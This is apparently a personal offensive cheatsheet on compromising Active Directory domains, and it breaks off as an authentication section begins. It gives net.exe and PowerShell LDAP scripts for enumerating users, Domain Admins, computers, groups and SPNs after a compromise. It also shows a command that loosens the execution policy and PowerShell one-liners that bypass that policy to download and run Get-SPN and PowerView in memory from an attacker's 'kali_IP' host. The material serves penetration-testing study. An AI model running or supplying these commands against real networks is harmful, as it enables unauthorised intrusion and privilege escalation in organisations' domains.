---
title: "Active Directory"
author: "Me"
date: "March 08, 2022"
output: html_document
---

# Active Directory
{:.no_toc}

This cheatsheets contains methods and scripts to compromise AD domains.

Here's the content so far:

1. TOC
{:toc}
{:style="color:black; font-size: 150%;"}

# 1. What is AD
Microsoft Active Directory Domain Services is a service that allows sysadmins to manage OS, applications, users and data access on a large scale. 
It consists of several components, the most important one being the *domain controller* (DC). A DC is a Windows 2000-2019 server with the AD role installed.
The DC is a prime target since it stores all information about how the specific instance of AD is configured. 

A domain is created (with a name like *example.com*, where *example* would be the organization's name) when an instance of AD is configured. 
Various types of objects, such as computers and users, can then be added to that domain. We refer to those objects as *domain-joined* objects. They have attributes that vary according to the type of object.
For example, a user object may include first name, last name, username, and password. 

# 2. AD enumeration
Once we successfuly compromised either a domain workstation or server, we can start enumerating the AD environment. We can either target high-value groups (compromise a member of the *Domain Admins* group, giving us access to every single computer in the domain)
or a DC (which contains all the password hashes of every single domain user account). We can use manual commands, customs scripts, and/or "well-known" scripts (tools) such as PowerView.

Note that some of the commands below may require administrative privileges on the compromised machine.

## Basic commands with net.exe

We can use the built-in *net.exe* to perform basic enumeration.
Although the possibilities are limited, it can be used to get a quick glimpse of the environment. 
Also, it doesn't require anything since it's installed by default.
For example, we can get the local accounts as follows:
````
net user
net user /domain
`````

The */domain* flag enumerates all users in the entire domain. Once we know users, we can query additional information about them:

````
net user discovered_username /domain
````
We can query groups with the following command:

````
net group /domain
`````

However, *net.exe* cannot list nested groups.

## Custom script

Below is a more powerful and flexible PowerShell script (that we can call *enumAD.ps1*) that can be adapted to fit our needs. 
It must be uploaded on the target (or pasted) and it may be necessary to modify the execution policy in PowerShell:

````
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

`````
 
**Enumerate users in the domain**

````
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "------------------------"
}
`````

In the search filter, 805306368 is the decimal off 0x30000000, which is the value used to enumerate all users in the domain.\\

**Enumerate members of the Domain Admins group**

````
…
$Searcher.filter="(name=*Domain Admins*)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.name
    $obj.Properties.member  
  
    Write-Host "------------------------"
}
`````


**Enumerate computers in the domain**

````
…
$Searcher.filter="(objectClass=computer)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.name
  
    Write-Host "------------------------"
}
`````

**Enumerate groups in the domain (and unravels nested groups)**

````
…
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.name
    Foreach($grp in $obj.Properties.name)
    {
        $Searcher.filter=”(name=$grp)”
        $res= $Searcher.FindAll()
        $res.Properties.member
    }
  
    Write-Host "------------------------"
}
`````

**Enumerate SPNs**

Instead of targeting and attacking a domain user account (to eventually compromise one that is a member of a high value group), we can target *service accounts*,
which may also be members of high value groups. An application is always executed in the context of an operating system user.\\
When a service is launched by the system itself, it uses the context baed on a *Service Account*. There are 3 predefined service accounts: *LocalSystem*, *LocalService*, and *NetworkService*.

A **SPN** (Service Principal Name) is a unique identifier used to associate a service on a specific server to a service account in AD. 
SPNs are used when applications such as Exchange, SQL, or IIS are integrated into AD.

Therefore, we can get the IP address and port number of applications running on servers integrated with the target AD by enumerating all registered SPNs in the domain.
The information as registered and stored in the DC, which we will query for specific SPNs (there are lists of searchable SPNs online). 
We can adapt the script to search for any SPN and resolve its IP address:

````
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter=“serviceprincipalname=*”
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
        Foreach($hostName in ((($prop.serviceprincipalname -split “/”)[1]) -split “:”)[0])
        {
        Resolve-DnsName -Name $hostName
        }
    }
Write-Host “----------------”
}
````
Note that we can also use the *Get-SPN* script (<https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Get-SPN.ps1>):

````
powershell.exe -exec Bypass -noexit -C “IEX (New-Object Net.WebClient).DownloadString(‘http://<kali_IP>:<port>/Get-SPN.ps1’);Get-SPN -type service -search ‘*’”
`````


## PowerView

PowerView is a PowerShell script which is part of the PowerShell Empire framework (<https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1>). 
The tool contains many functions, but we will focus on two in particular:

- *Get-NetLoggedon*: invokes *NetWkstaUserEnum* (requires administrative permissions) to return a list of all users logged on to a target workstation.
- *Get-NetSession*: invokes *NetSessionEnum* (can be used from a regular domain user) to return a list of active user sessions on servers (such as fileservers or DC).

First, we must must either transfer it and import it on the target or download it and execute it in memory (start a web server first):

````
Import-Module .\PowerView.ps1
powershell.exe -exec Bypass -noexit -C “IEX (New-Object Net.WebClient).DownloadString(‘http://<kali_IP>:<port>/powerview.ps1’);Get-NetLoggedon -ComputerName <computername>”
````

**Enumerate logged-in users** (require admin privs)

````
Get-NetLoggedon -ComputerName <computername>
`````

**Enumerate active sessions**

````
Get-NetSession -ComputerName <computername>
````
Here we would tipically target a DC or server. 
The sessions are performed agaisnt the DC when a user logs on, but they originate from a specific workstation or server, which is what we are attempting to enumerate.


# 3. AD authentication
We can use the information we discovered by enumerating users accouts, group memberships and registered SPNs to compromise AD.\\
AD uses mainly 2 authentication protocols:

- NTLM authentication: used when a client authenticates to a server by IP address or if the user tries to authenticate to a hostname that isn't registered on the AD integrated DNS server. Applications can also simply choose to use NTLM.
- Kerberos authentication: default authentivation protocol in AD. Kerberos uses a ticket system.





